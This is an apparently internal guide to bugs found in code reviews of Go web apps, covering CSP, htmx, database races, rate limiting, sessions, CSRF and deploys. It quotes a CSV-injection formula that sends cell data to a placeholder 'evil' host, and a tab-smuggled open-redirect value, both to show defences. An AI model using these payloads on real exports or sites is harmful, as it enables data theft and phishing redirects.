# What reviews keep finding

A catalogue of real bugs found by reviewing each phase of a real project built in
this style — not hypotheticals. Every one passed `go build`, `go vet`, `gofmt` and
a full green test suite. Several returned HTTP 200.

**Review every phase before moving on.** In seven phases, every single review pass
found something, and two of them found a shipped feature that did not work at all.
A phase is not done when the tests pass; it is done when someone has looked for the
class of bug the tests structurally cannot see.

**Two of the sections below are only reachable with a browser** (the CSP ones), and "is
this still referenced" is only reliably answered by gopls. Drive the UI in a headless
browser (never a visible window) and query symbols with `gopls references` — see "Tools" at the top of
`SKILL.md`.

⚠️ marks the ones that rated high under the `dev-workflow` severity rubric (a user or
attacker hits it, data loss, a security hole, a check that cannot fail).

---

## The invisible ones: green tests, broken product

### ⚠️ CSP blocks inline event handlers, not just inline styles

The house rule is "zero `style="…"` in served templates" so `style-src` can stay
`'self'`. **The same applies to `on*=` attributes and `script-src`.** A filter
wired as:

```html
<select name="location" onchange="this.form.submit()">
```

does **nothing** under `script-src 'self'` with no `'unsafe-inline'`. The browser
refuses to run it. The page renders, returns 200, and every handler-level test
passes — because handler tests never execute JavaScript. Two separate list pages
shipped this way and neither filter had ever worked.

The fix is not `'unsafe-hashes'`. Use a real submit button, which needs no
JavaScript at all:

```html
<button type="submit">Filter</button>
```

Enforce it: a test that asserts no served page contains `onchange=` (or any `on*=`)
and that each filter form has a submit button. And **check admin UI in a browser** —
this is the canonical example of what the suite cannot reach.

### ⚠️ htmx 4 validates a form before every request it sends — bubbles included

On a `<form>` (not `novalidate`), htmx 4 calls `form.reportValidity()` before each
request, GETs too. A live preview (`hx-get` + `hx-trigger="change"`) on a form with
`required` fields therefore pops "Please fill in this field" and steals focus on
every change while it is half filled, and sends nothing. htmx 2 checked silently.
Headless Chromium shows no bubble, so a browser check misses it too unless you
assert a request went out. Put `hx-validate="false"` on a preview form and let the
endpoint handle incomplete input; the real submit still validates natively.

### ⚠️ htmx 4's default sync can leave a preview stale

The default is `queue first`: while a request is in flight the next one is queued
with the form values *captured when its event fired*, and further ones are dropped.
Three quick edits show the second one's result. htmx 2 queued the last and read the
form late. Use `hx-sync="replace"` (abort and send the newest) on anything that
previews form state.

### ⚠️ htmx 4 upgrade: things that fail quietly

- **Pin the version.** npm's `latest` tag stayed on 2.x after 4.0.0 shipped (4 is
  `next`), so "install latest" gets 2. `npx htmx.org@4 upgrade-check ./` lists
  `file:line` fixes.
- **Stale 2.x config is silently ignored.** `includeIndicatorStyles`,
  `responseHandling` and friends do nothing in 4, so a leftover `htmx-config` meta
  looks meaningful and isn't.
- **4xx/5xx swap by default** (only 204/304 don't). A full error page returned with
  an error status now replaces the target. Restore 2.x behaviour with
  `noSwap: [204,304,"4xx","5xx"]` or per element with `hx-status:4xx="swap:none"`.
- **Inheritance is explicit.** A parent's `hx-target`/`hx-swap`/`hx-include`/
  `hx-indicator` reaches children only as `hx-target:inherited="…"`; otherwise the
  child silently swaps its own innerHTML.
- **`hx-get` on a button inside a form no longer sends the form's fields** — add
  `hx-include="closest form"`. An `hx-get` on the form itself still does.
- **Renames:** `hx-disable` → `hx-ignore`, `hx-disabled-elt` → `hx-disable`; events
  are colon-separated (`htmx:after:swap`); `HX-Trigger`/`HX-Trigger-Name` request
  headers became `HX-Source` (`tag#id`); `HX-Trigger-After-Swap/Settle` are gone.
- **CSP:** the indicator CSS is now a constructable stylesheet, which `style-src`
  doesn't govern — the htmx 2 "indicator styles fail open" trap (and its
  `includeIndicatorStyles:false` + rules-in-your-stylesheet workaround) is gone.
  Requests use `fetch`, still under `connect-src`. `hx-on`, `js:` values and trigger
  filters use `new Function`, which `script-src` without `'unsafe-eval'` blocks —
  that is the control; there is no `allowEval` switch in 4.
- **`data-hx-` counts too.** htmx 4 honours the `data-hx-` prefix by default, so a
  test guarding against `hx-on` must match `(?i)\s(data-)?hx-on[:-]`; `\shx-on`
  alone lets `data-hx-on:click` through, and the CSP then refuses it silently. The
  same goes for the other markup guards: match `src`/`href` with any quoting
  (`'…'`, `"…"`, unquoted) and match `src` as a whole attribute so `data-src` is not
  mistaken for it. Prove each guard by adding the forbidden markup and watching the
  test fail.

### ⚠️ A graceful-shutdown test that cannot fail

"Cancel the context, then assert the in-flight request returned 200" passes even when
the server calls `Close` instead of `Shutdown`: nothing orders the request against the
shutdown. Order it explicitly: a test handler signals when entered and blocks; wait for
the signal; cancel; poll (with a deadline) until a fresh dial is refused, so `Shutdown`
has closed the listener; assert `run` has not returned; release the handler; assert 200
and a nil error. Release the handler from `t.Cleanup` too, so an early `t.Fatal` cannot
leave it blocked. Swap `Shutdown` for `Close` once to prove the test fails.

Handler tests prove none of this: drive the page in a browser and assert the
requests and swaps.

### ⚠️ CSP source paths are exact matches, not prefixes

A source not ending in `/` matches that literal path only. Listing a bucket base
URL in `img-src` refuses every object beneath it. Invisible to `curl` and to the
markup. Strip to scheme+host and regression-test it.

---

## Data integrity

### Check-then-write is not atomic — and it keeps coming back

This was found in three separate phases, twice *after* being written down:

- a create path using `Upsert`, silently overwriting someone else's row;
- a duplicate check racing the insert that followed it;
- a "refuse to disable the last admin" guard that counted, then updated — two
  admins disabling each other concurrently each saw "2 enabled", each passed, and
  between them locked everyone out.

**Every guard is one statement.** `INSERT … ON CONFLICT DO NOTHING` +
`RowsAffected`, or the count as a subquery in the `UPDATE`'s `WHERE`. See
`sqlite.md` for the shapes. Being able to recite the rule is not the same as
applying it to the function you are writing.

**⚠️ On Postgres the one statement is not enough.** Under READ COMMITTED two
`UPDATE`s on different admin rows each count two enabled admins in their own
snapshot, both succeed, and none remain; SQLite is safe only because
`_txlock=immediate` serialises writers, so the SQLite suite cannot see it. Lock first
(`SELECT … FOR UPDATE` over the rows the count reads, or `pg_advisory_xact_lock`).
Likewise a sign-in's `INSERT … SELECT FROM users WHERE password_hash = $1` needs
`FOR SHARE` on the user row, or a session survives a concurrent password reset. Prove
each lock with a test that holds it in one transaction and asserts the other blocks.

### ⚠️ A form that writes back an absolute value someone else changes

The variant edit form was pre-filled with stock at page load and saved
`stock_qty = $n`. A sale landing in between was overwritten: sold stock came back,
and a later buyer was not flagged oversold. Write the change, not the value: a
hidden `stock_was`, then `stock_qty = stock_qty + ($n - stock_was)`; a result below
zero trips the `CHECK` and becomes a field error asking for a reload. Bound the
input. Seeds and creation stay absolute. Any counter a background path also moves
(stock, balance, quota) has this shape — check every writer, API tools included.

### SQLite: deferred transactions and swallowed Scan errors

A read-then-write transaction without `_txlock=immediate` fails with "database is
locked" under contention, and a Scan error turned into a zero value makes data look
absent. Both in `sqlite.md`.

### A list and its count must read the same rows

`List` used `JOIN groups` while `Count` read the base table alone. An orphaned row
would vanish from the page and from the CSV export while still inflating the total,
so the page would claim more rows than it showed. `LEFT JOIN` with a `COALESCE`
fallback keeps the two in agreement. A foreign key making orphans "impossible"
today is not a reason for the two queries to disagree.

### Validating an identifier is not normalising it

`mail.ParseAddress` accepts RFC 5322's display-name form, so
`Sample User <user@app.example>` validates. Stored raw, it becomes a **second account for
one mailbox**: it does not collide with the plain address under a
`UNIQUE COLLATE NOCASE` index, so the uniqueness guard never fires — and it can
never sign in, because the login form's `type=email` input will not accept the
string back. Store `addr.Address`.

Generalise: **anything that becomes an identity needs validating *and* normalising**,
and the normalisation has to match how every read path matches.

### An export must not overwrite the only copy

`os.Create` truncates before the export runs. Combined with a driver that creates
an empty database for a missing path, a wrong `DB_PATH` overwrites a real data file
with `null` and reports success. Render to a buffer, refuse an empty export over an
existing file, `os.Rename` into place. See `sqlite.md`.

---

## HTTP surface

### Buffer a download before writing headers

Setting headers and then streaming means a mid-export failure has already committed
a 200. The operator gets a truncated or zero-byte file that looks exactly like a
good backup — a backup that fails silently is worse than one that fails loudly.
Buffer, then write headers, then copy. The same reasoning as rendering a template
into a buffer so a template error can still be a 500.

### Rate-limit every endpoint that verifies a password — not just login

A "change my password" form that requires the current password is a **guessing
oracle** with a distinct wrong-password response, and it is exactly the control
that stops a stolen session becoming a permanent account takeover. Unlimited, it is
also a memory lever: argon2id at real cost is ~64 MiB per attempt.

Put it behind the same limiter as the login POST. Note the login limiter's tight
tier should *not* be keyed on a cookie — an attacker discards that for free before
a login attempt — so key the tight tier on something they cannot drop, with a
looser per-IP ceiling behind it.

### ⚠️ A per-IP limiter keyed on the raw address

Keyed on the full IPv6 address, 1000 addresses from one /64 each got a fresh
bucket — every throttle bypassed — and the map grew without bound between sweeps.
Key IPv6 by /64 (after unmapping `::ffff:a.b.c.d`, stripping any zone); cap the
map; at the cap run a sweep (itself rate-limited, or the flood makes every request
sweep) and, if still full, 429: fail closed, existing clients unaffected. Do not
create the second-tier (email) bucket when the IP tier already refused, or a refused
flood still fills the second map. Use `AccountKey` for a normalised, bounded key;
it does not validate the identifier.

The `ratelimit` module does all of this. In review, the trap moves to how it is used:
hand-rolled limiter code in an app (replace it), a limiter keyed on something other
than the `clientip.Source` result, `FailOpenWhenFull` without a stated reason, or
an account-tier `Allow` called before the IP tier passed.

### ⚠️ Client address from headers

`X-Forwarded-For`/`CF-Connecting-IP` can carry `ip:port` or `[v6]:port`; keyed raw,
each source port is a new client. Parse to the bare address, and set
`MaxHeaderBytes` (64 KiB; the default 1 MB makes a huge limiter key possible) and
`ReadHeaderTimeout` on the `http.Server`.
`CF-Connecting-IP` is only trustworthy when Cloudflare is the sole way in (a
tunnel); behind any other proxy that passes it through, the client sets it.

`ratelimit/clientip` parses and normalises; what it cannot know is the ingress. Check
the `Source` against the real chain (deploy config, proxy settings): `TrustedProxies`
needs a proxy that *appends* its peer to `X-Forwarded-For` (Kamal's proxy needs
`forward_headers: true` for that), and a `TrustedHeader` is only safe when nothing can
reach the app around the component that sets it. A wrong `Source` either lets every
visitor spoof their key or puts every visitor in one bucket.

**⚠️ Under Kamal, both obvious values are wrong somewhere.** `remote` sees only the
proxy container, so every visitor shares one sign-in bucket (a burst of bad posts locks
everyone out) and every log line shows the proxy. `forwarded` (leftmost
`X-Forwarded-For`) is safe only behind an ingress that *replaces* the header: Kamal
Proxy with `ssl: true` rebuilds it (read in its v0.10.2 source), but with `ssl: false`
it appends, and a rehearsal logged a client-forged address as the client. Behind a
tunnel use `cloudflare` (if Cloudflare is the sole way in) or accept `remote`; after a
first deploy, read `client_ip` from a failed sign-in.

### Unbounded password-hash concurrency

argon2id at ~64 MiB each: fifty parallel logins exceed a 1 GiB container limit
before any rate limit matters (it is per IP). Cap concurrent hashes with a
semaphore sized from the memory limit: with the `password` module that is
`password.SetConcurrency(n)` at startup. The module default is `max(2, min(NumCPU, 4))`;
a small container (512 MiB) wants 2. A missing call is the review finding.

### An expired row behind a cookie must not 500

A cart cookie outliving its swept row turned updating or removing a line into a
500. Every path that loads a cookie-referenced row treats "not found" as the same
expired state a missing cookie gets — and renders **the page or fragment the htmx
target swaps** (the empty cart with the reason), not a small status block, which
left the stale lines on screen.

### Parse a state change strictly; absent must not mean permissive

```go
disable := r.PostFormValue("disabled") == "1"   // wrong
```

Any other value — including an absent field — reads as "enable". A POST with a
valid CSRF token and an empty body silently re-enabled a disabled account and
reported "Saved." Disabling was the guarded direction; enabling was not. Require an
explicit `"0"` or `"1"` and 400 on anything else.

### Escape a redirect built from data

Location names can contain spaces (`North Hall`). Concatenating one into a
`Location` header breaks it. `url.Values{...}.Encode()`.

### ⚠️ A `?next=` that a browser reads as another host

A login handler that checks `next` starts with `/` and not `//` (and refuses CR/LF)
passed review and was an open redirect: `"/\t/evil.example"` is `//evil.example` to a
browser, which strips TAB/LF/CR anywhere in a URL and reads `\` as `/`. Go's own HTTP
client refuses to parse that `Location`, so a test through `http.Client` errors instead
of showing the bug; assert on the raw header, or check it in a real browser
(`new URL(loc, base).host`). Use `websec.SafeRedirect` (raw and decoded checks, browser
dot segments including `%2e`, a trailing space, an optional `Prefix` and `Deny`). In
review, check that **every** redirect target taken from a request (`next`, `return`,
`back`, a Referer) goes through it or through an exact allow-list, and that the value
the auth middleware generates (usually `r.URL.RequestURI()`) still round-trips.

---

## Exports of user-supplied text

### ⚠️ CSV is a code-execution path

Excel and Sheets evaluate a cell beginning `=`, `+`, `-` or `@`. A name or message
typed into a public, unauthenticated form therefore becomes a live formula the
moment an operator opens the export on a staff machine:

```
=HYPERLINK("http://evil/?"&A1,"click")
```

Prefix such values with an apostrophe. Route **every** text cell through one helper
so a column added later cannot slip past the escaping: `websec.CSVRow(cells...)`. A
helper that checks only the first byte misses `" =cmd"` and a BOM before the `=`;
`websec.CSVCell` strips leading spaces, controls and format characters before it looks
(and drops them from the cell).

Note `+` is the realistic trigger, not the malicious one: `+27…` phone numbers hit
it constantly, which is also how you get a test that fails for a mundane reason.

---

## Templates and route wiring

### One parsed template set per page

If every page defines `content`, a single flat `ParseFS` set lets the **last file
parsed silently win** — pages render as each other. Parse one set per page
(partials + that page's layout + that page), keyed by filename. A page defining no
`content` should be a *startup* failure, not an empty page discovered later.

### Choose the layout by directory, not by a flag

A page rendered to someone with no session (the login form) needs a layout with no
sign-out button *in scope* — not a conditional inside the normal layout. Structural
beats remembering.

### Derive the protected-route list; never hand-maintain it

Register admin routes through a closure that records each one, and have a test
enumerate them and assert every one refuses an anonymous request. A hand-written
second list fails silently in exactly the case the test exists to catch.

Two details that matter:

- **Record the method.** A POST-registered route answers a GET with 405 *before*
  any middleware runs, so a GET-only enumeration reports it as "protected" while
  never having exercised its protection.
- **Pin the direct `mux.Handle` lines by source text** in a test. Routes mounted
  outside the closure are both unprotected and invisible to the enumeration; an
  allowlist of the legitimate few (assets, login, logout) turns a fifth into a
  test failure. This caught a genuinely new mounting path immediately.

### Notices come from a fixed code map

`?notice=saved` → a lookup in a `map[string]string`. Never render the query
parameter. There is no convenience in echoing it worth a reflected-content hole.

### No admin page may share a basename with a public fragment

Two template sets, one namespace of names, silent collision.

---

## Auth specifics

### Sessions: a database table, or a signed cookie?

`gorilla/securecookie` exists to make a *self-describing* cookie unforgeable
without server state. That is the wrong shape as soon as you need named accounts,
per-user disable, or "changing a password ends existing sessions" — each of those
requires a lookup on every request anyway, so the table is not the cost, it is the
mechanism. Store the `sha256` of an opaque random token (`crypto/rand`), not the
token itself: nothing to forge, no MAC, no key rotation runbook.

Use securecookie when the cookie genuinely must carry claims and there is no
revocation requirement. Otherwise the table.

### The admin session cookie ignores the public `SameSite` setting

An embedded public form may need a cross-site cookie. An admin credential must
never follow it to `SameSite=None`, which would let any site make the browser
send it. `websec/cookie` fixes the session cookie at Lax and HttpOnly.

### Make a failed login cost the same as a missing account

Verify against a dummy hash when the email is unknown, and treat a disabled account
identically to a wrong password. Otherwise response time and message between them
tell an attacker which addresses have accounts. Check `disabled` *after* the
password, or the account state becomes an oracle for the password being right.

Test the dummy check with a **well-formed** unknown address: a malformed one returns
before the database, so an early return for "not found" passes. Make the call
observable (a package variable `checkDummy = password.CheckDummy` a test swaps for a
counter) rather than timing it.

### ⚠️ A credential header never falls back to the cookie

An API that accepts `Authorization: Bearer` and also a session cookie must use the
cookie only when **no** `Authorization` header is present. `Bearer ` with an empty
token, `Basic …`, an unparsable value or a second header all fell back to the cookie
in two apps. Any header present: exactly one, parsed as `Bearer <non-empty>`, or 401.
Parse the scheme separator as space or tab, and do not trim Unicode spaces.

### Password policy: length only

No composition rules — they push people towards short mangled words while argon2id
already makes offline guessing expensive. A 12-character minimum admits a
passphrase, which is what you would rather they chose.

**And enforce it on every path.** A documented minimum was implemented in the web
forms but not in the CLI that creates the *first* and most privileged account. A
doc claim added in the same commit as the code it describes still needs checking
against every path.

---

## Kit adoption traps

Found while moving several apps onto `websec` and `ratelimit`. The module READMEs
carry the API; these are the mistakes the adoption itself produced.

- **⚠️ Cap the body before the token parse.** nosurf parses the form to find the
  token *before* any auth runs, so an anonymous request can make the server read a
  large body, and spool a multipart one to disk. The cap must sit in front and cover
  declared lengths and streamed reads alike; `websec/csrf` does both, but only if no
  parser runs ahead of it. A `MaxBytesReader` in a handler comes after the parse.
  Go's `FormValue` parses multipart even on a GET, hence the kit's 415.
- **The `Origin` is mandatory and exact:** lower-case `scheme://host[:port]`, no path,
  no trailing slash, no default port. A value an old hand-written check silently never
  matched now fails startup, so check it with `csrf.ValidateOrigin` in the config check
  (`-check-config` or its equivalent) **before any migration runs**: a deploy must not
  migrate the database and then refuse to start.
- **Build the CSRF policy before the handlers** and pass it to their constructors. A
  setter called later is silently skipped when forgotten, and then sign-in never
  renews the token.
- **`Renew` at sign-in, sign-out and password change, and test the old token.** A test
  that only sees the cookie change passes when the old token still works; post the
  pre-change token after the change and expect 403.
- **A cookie prefix is a rename.** Adopting `__Host-`/`__Secure-` signs everyone out
  once and makes forms open at deploy time expire once: put both in the deploy note.
  Test that a bare-named legacy session cookie is ignored, not honoured. A browser
  stores a `__Host-` cookie only with Secure, `Path=/` and no Domain, so a dev setup
  over plain HTTP silently has no session unless the builder is `Insecure`.
- **⚠️ Test the cookie the config builds**, not one the test constructs: every handler
  test building its own cookie let `Insecure: true` in `config.Load` reach production
  unseen. Set it from the loaded config and check it with `webtest.WantCookie`.
- **Compute lifetimes from the columns rows already have** (`created_at`, `last_seen`)
  through `session.Lifetime`; a stored `expires_at` is only derived. Existing rows then
  get their real age at deploy, with no backfill. Check what the *old* binary does with
  the derived values the new one writes, and put it in the rollback note.
- **Never log a path that carries a one-time token.** Log the matched mux pattern
  (`LogPath` for the CSRF refusals, the same for request logs) and a constant for
  unmatched routes. A prefix redactor misses `//auth/<token>`, which the mux answers
  with a redirect after the log line is written.
- **`Sec-Fetch-Site: same-origin` passes nosurf's origin step without comparing
  `Origin`.** Browsers set it, page scripts cannot, and the token is still required, so
  it is sound; an app that wants `Origin` matched regardless keeps its own check in
  front of the wrapper.
- **A session needs an idle *and* an absolute limit.** Sliding expiry alone lets a busy
  tab live forever. Throttle the `last_seen` write (`NeedsTouch`) and rewrite a future
  value: after the clock steps back, a throttle that only compares "older than a
  minute" never touches it again, and idle expiry is off until the clock catches up.
  Judge expiry with the clock that wrote the timestamp: never compare a database
  `now()` with a Go `time.Now()`, or clock skew moves every deadline. The sweep must
  delete idle-expired rows as well as absolute ones.
- **A directory-backed session snapshots groups at sign-in.** Someone removed from the
  directory keeps access until the session ends. Recheck on an interval
  (`checked_at`/`verified_at` on the row) and fail closed once an outage outlasts a
  stated grace period.
- **Run `sessiontest` against the real store**, through the real sign-in and lookup
  paths. Its `Backdate` must recompute every stored expiry and derived timestamp, or
  the suite tests rows that cannot exist.
- **An added column can stop the rollback.** A migration provider that refuses a
  database newer than its binary (`goosestrict` does) makes the previous image refuse
  to start after even an additive migration. Ship a Down, write the exact undo SQL in
  the deploy note and rehearse it on a copy, as the app's user with the app stopped.
  Prefer a stop-first deploy when the old container would keep writing rows the new
  schema then has to reconcile.
- **Retiring an environment variable: ignore a leftover value.** Deploy configs keep
  it for a while; failing startup over a setting nothing reads is an outage for
  nothing.
- **Booleans are `true` or `false`, nothing else.** `0`/`1`/`auto`/empty were each
  read differently by different apps; an `auto` that trusted a forwarded header made
  `Secure` client-controlled. Refuse anything else in `config.Load`.
- **`-migrate-down` refuses the baseline** and a missing database: undoing `0001` drops
  every table, and a mistyped `kamal app exec` would do it. Go back past the baseline
  with a backup.
- **Random values flake text assertions.** A base64url id that starts with `-` gets
  `CSVCell`'s apostrophe; a short string such as `R43` turns up inside random token
  text a few runs in a thousand. Force the fixture's values, or strip tokens before
  scanning output for what must be absent.
- **Proving erased data is gone takes more than a query.** Byte-scan the main file,
  the `-wal` and the `-shm`; classify each main-file hit with `dbstat` before
  concluding (short numbers coincide with unrelated data); check free pages and the
  freelist (`secure_delete` zeroes them). Backups and old containers' logs still hold
  copies.
- **Store only what you need, for as long as you need it.** An amount kept only until
  a payment settles is one less thing to erase, export or leak.

---

## Mail

### Send through `mailer`, not `net/smtp`

A hand-rolled sender passed `smtp.PlainAuth` with an empty user, which is a non-nil
`Auth`, so every send to mailpit (no AUTH offered) failed and local mail never worked.
It survived because only the header helper beside the transport had a test.
`mailer`'s SMTP sender attempts no AUTH without credentials and pins that against an
in-process fake server; an app that still talks `net/smtp` is the finding. The lesson
that stays: test the code that talks to the network, not the helper beside it.

### Persist before sending, always

Write the submission, then attempt the mail, then flag it as sent. A delivery
failure must never lose a submission. Surface `email_sent = 0` as a filter *and* a
count on the index — it is the operationally interesting row: captured, never
delivered, and the visitor believes it was sent.

This invariant pays for itself the first time delivery breaks. When the SMTP bug
above hit, every submission was still in the database with `email_sent = 0`.

---

## Test-harness traps

- **A signed-in POST test cannot scrape a CSRF token from the login form** — that
  page redirects once a session exists, so the scrape returns nothing. Pass the
  token the sign-in helper returns.
- **Emulate a browser's origin headers.** nosurf checks `Sec-Fetch-Site`, `Origin`
  and `Referer` as well as the token, and refuses a post with none of them; a test
  sending none is not emulating a form post. Send the configured `Origin` to exercise
  the comparison (webtest does by default); a client that always sends
  `Sec-Fetch-Site: same-origin` skips it and hides a wrong trusted origin. On plain
  HTTP, the policy needs `Insecure` and an `http://` origin, or every post looks
  cross-origin.
- **⚠️ An expectation computed by the code under test cannot fail.** A Location
  compared with `safeNext(next)`, a cookie name from `cookie.PrefixedName`: each agrees
  with the bug it should catch. Write literals. webtest itself re-states the browser
  rules rather than importing the kit's code, for the same reason.
- **⚠️ A token helper must read the form it claims to.** `page.Token()` returns any
  token on the page, and the layout's sign-out form always has one, so a form that
  lost its own token input still passed. Read it through `Form(action)`.
- **Sweeps that pass vacuously:** a floor of `len == 0` or far below the real count,
  every route sent as GET (a POST route's 405 looks like a refusal), a `Public` entry
  with no reason, a stale `Public` entry nobody checks. Set `Min` to the real count and
  lower it deliberately when a route goes. In-process, a handler that panics for want
  of a user kills the test binary instead of naming the route: wrap the mux in a
  recover-to-500 for the sweep.
- **Logout tests: replay the old cookie from a fresh client.** Checking that the same
  client is signed out only proves the cookie was cleared; a logout that leaves the
  row server-side passed in three apps.
- **Hostile `?next=` values: loop over `webtest.HostileRedirects()`** and assert the
  raw Location. One spelling (the tab) let `//` and `/\` through, and a test through
  `http.Client` fails on a parse error, not on the assertion.
- **Log probes need a marker, a floor and encodings.** `NoSecrets` requires a literal
  from the expected line (an empty log passes any absence check), secrets of 12+ bytes
  (short needles match random ids), and catches base64, hex and percent-encoded copies
  `strings.Contains` misses. A test whose logger writes to `io.Discard` can never see a
  leak. Probe every path that handles a secret (sign-in, token issue, setup), not one.
- **Secure cookies over HTTP in tests.** Go's jar does not send a Secure cookie to a
  non-loopback `http://` origin, so a production-config test silently loses its
  session: use an `https://` origin in-process or `httptest.NewTLSServer`. Read a
  path-scoped cookie with `CookieAt(path, name)`, not an extra request that may renew it.
- **Kill stale servers and pick a fresh port.** A `go run` left over from an
  earlier check, still answering on the same port, produced a confident false
  reading twice. The giveaway is a response that does not match what the code
  should do. `pgrep -af <binary>` first.
- **Use cheap argon2 parameters in tests** — real ones cost ~100ms and 64 MiB per
  verification. With the `password` module: `password.SetParamsForTesting(...)` once in
  `TestMain` (the params are global, so never per test alongside `t.Parallel`).
- **Assert a minimum count in any "every X must Y" test**, or it passes vacuously
  the day the fixture stops loading.
- **⚠️ Tests that skip silently without Postgres (or S3).** A green `go test ./...`
  with no `TEST_DATABASE_URL` ran none of the SQL. Run the gate with the database
  up and state how many tests skipped; make the gate fail without it
  (`TEST_REQUIRE_DB=1`). There is no hosted CI to run them for you.
- **A flaky gate is a finding**, not a rerun: random fixture values (see "Kit adoption
  traps"), or a test that waits on a state flag instead of the callback it checks.
  "Green on rerun" hides the next real failure.

---

## Deploys

Every deploy needs the user's word; these are the steps that keep one reversible.

- **Back up inside the volume, then rehearse on a copy, on the host.** A `VACUUM INTO`
  (or `sqlite3 .backup`) as the app's UID, `PRAGMA integrity_check` = `ok`; then start
  the new image with the production environment against a copy in a scratch volume
  and check `-migrate-status` and `/healthz`. No production data leaves the host;
  delete the copies when the user agrees.
- **Verify production with GET requests only.** Never POST to a live form or payment
  endpoint; a real sign-in is the user's test, and the report says so.
- **⚠️ Never delete, move or copy a live SQLite database's `-wal` or `-shm`.** Recent
  commits can live only in the WAL; removing it loses them. No manual checkpoint on
  production without the user's word.
- **Postgres accessory first.** `kamal setup` boots the accessory but does not wait
  for it; the app exits if the database is not up in time. `kamal accessory boot
  postgres`, wait for `kamal accessory details postgres` to say healthy, then deploy.
- **A Down step runs in a one-off container** (`kamal app exec --version <new>`) with
  the app stopped; `--reuse` runs it inside the live server, alongside its writes.
- **`kamal remove` keeps named volumes** (deleting one is a separate, explicit step);
  `kamal accessory remove` deletes the accessory's data directory. Keep data on named
  volumes and check backups before either.

---

## Docs

- **Docs and comments that disagree with the code** (a limit, a sweep interval, a
  list of limiters) — check each claim against the code it describes, in the same
  review.
- **No private sibling repos or local paths** (`~/dev/...`) in public docs or
  comments; no session logs or "what we did today" in the README.
